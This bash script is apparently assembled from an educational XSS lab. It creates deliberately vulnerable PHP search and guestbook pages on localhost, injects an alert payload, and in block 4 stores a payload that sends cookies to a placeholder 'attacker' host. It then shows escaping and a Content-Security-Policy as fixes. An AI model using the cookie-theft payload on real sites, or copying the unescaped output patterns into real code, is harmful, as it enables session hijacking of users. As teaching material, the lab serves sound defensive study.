#!/usr/bin/env bash
# Lab 10 — Cross-Site Scripting (XSS)
# Auto-assembled from the lab's command blocks. Review before running.
# Run on the Killercoda Ubuntu Playground: https://killercoda.com/playgrounds/scenario/ubuntu
set -uo pipefail

echo '=== block 1 ==='
apt update && apt install -y php-cli
mkdir -p /tmp/xss && cd /tmp/xss

echo '=== block 2 ==='
cat > search.php <<'EOF'
<?php
$q = $_GET['q'] ?? '';
echo "<h1>Results for: $q</h1>";
EOF
php -S 127.0.0.1:8080 -t . &
sleep 1

echo '=== block 3 ==='
curl -s "http://127.0.0.1:8080/search.php?q=<script>alert(1)</script>"

echo '=== block 4 ==='
cat > guestbook.php <<'EOF'
<?php
$file = '/tmp/xss/posts.txt';
if (!empty($_GET['msg'])) file_put_contents($file, $_GET['msg']."\n", FILE_APPEND);
echo "<h2>Guestbook</h2>";
if (file_exists($file)) echo nl2br(file_get_contents($file));
EOF

curl -s "http://127.0.0.1:8080/guestbook.php?msg=<script>document.location='http://attacker/?c='+document.cookie</script>"
curl -s "http://127.0.0.1:8080/guestbook.php"

echo '=== block 5 ==='
cat > search.php <<'EOF'
<?php
$q = $_GET['q'] ?? '';
echo "<h1>Results for: " . htmlspecialchars($q, ENT_QUOTES, 'UTF-8') . "</h1>";
EOF
curl -s "http://127.0.0.1:8080/search.php?q=<script>alert(1)</script>"

echo '=== block 6 ==='
kill %1 2>/dev/null
cat > router.php <<'EOF'
<?php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
include $_SERVER['SCRIPT_NAME'] === '/router.php' ? 'search.php' : ltrim($_SERVER['SCRIPT_NAME'],'/');
EOF
php -S 127.0.0.1:8080 router.php &
sleep 1
curl -sD - "http://127.0.0.1:8080/search.php?q=hi" | head

